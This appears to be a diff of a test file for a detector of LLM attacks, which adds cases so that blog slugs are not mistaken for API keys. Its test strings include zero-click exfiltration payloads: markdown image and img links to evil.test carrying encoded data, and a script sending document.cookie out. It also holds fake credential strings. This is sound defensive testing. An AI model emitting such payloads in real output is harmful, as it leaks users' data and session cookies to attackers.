@@ -54,7 +54,7 @@ describe("prompt injection and other LLM attacks", () => {
   it("checks model output for zero-click exfiltration, credentials and script", () => {
     expect(ids("Here you go ![logo](https://evil.test/p.png?d=Q3VzdG9tZXIgbGlzdDogYWxpY2UsIGJvYg)", "output")).toContain("llm.output_exfiltration");
     expect(ids('<img src="https://evil.test/x?data=c2VjcmV0LWNoYXQtaGlzdG9yeQ">', "output")).toContain("llm.output_exfiltration");
-    expect(ids("Your key is sk-proj-abcdefghijklmnopqrstuvwxyz012345", "output")).toContain("llm.output_secret");
+    expect(ids("Your key is sk-proj-Ab3dEfGh1jKlMn0pQrStUvWxYz012345", "output")).toContain("llm.output_secret");
     expect(ids("Click <script>fetch('//evil.test?c='+document.cookie)</script>", "output")).toContain("llm.output_script");
     expect(ids("![build](https://img.shields.io/badge/build-passing-green?style=flat)", "output")).toEqual([]);
     expect(containsCanary("the secret is canary 7F3A-9C1E!", ["canary-7f3a9c1e"])).toBe(true);
@@ -210,5 +210,34 @@ describe("attempts to get at API keys", () => {
   it("catches environment-style secrets in model output", () => {
     expect(ids("Sure, here it is: AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "output")).toContain("llm.output_secret");
     expect(ids("Set OPENAI_API_KEY in your .env file, then restart.", "output")).toEqual([]);
+  });
+});
+
+describe("credential formats in ordinary text", () => {
+  const slugs = [
+    "samsung-sk-hynix-upgrade-china-nand-plants-xian-286-layer-dalian-240-layer-export-licenses-reuters-2026",
+    "samsung-tsmc-nvhbm-base-die-3nm-nvidia-hbm-claimed-vs-verified-2026",
+    "samsung-littlebit-13b-under-1gb-sub-1-bit-llm-2026",
+    "samsung-hbm4-80-percent-yield-ahead-of-schedule-august-2026",
+    "how-to-ask-sk-telecom-for-a-refund-2026",
+  ];
+  it("doesn't read blog slugs as keys, and leaves them readable in evidence", () => {
+    for (const slug of slugs) {
+      const line = `{"method":"GET","path":"/blog/${slug}","srcIp":"81.22.141.63","clientUa":"Mozilla/5.0 Chrome/131.0.0.0"}`;
+      expect({ slug, ids: ids(line, "http") }).toEqual({ slug, ids: [] });
+      expect(redactLine(line)).toContain(slug);
+    }
+    expect(ids("akiapolaau-bird-facts-and-photos-for-kids", "log")).toEqual([]); // formats are case-sensitive
+  });
+  it("still catches real-looking keys", () => {
+    for (const key of [
+      "sk-proj-Ab3dEfGh1jKlMn0pQrStUvWxYz012345AbCd",
+      "sk-ant-api03-Zx9Yw8Vu7Ts6Rq5Po4Nm3Lk2Ji1Hg0FeDcBa",
+      "sk-0123456789abcdef0123456789abcdef",
+      ["AKIA", "IOSFODNN7EXAMPLE"].join(""), // AWS's documented example key
+    ]) {
+      expect({ key, ids: ids(`client init key=${key}`, "log") }).toEqual({ key, ids: ["app.secret_in_log"] });
+      expect(redactLine(`client init ${key}`)).not.toContain(key);
+    }
   });
 });
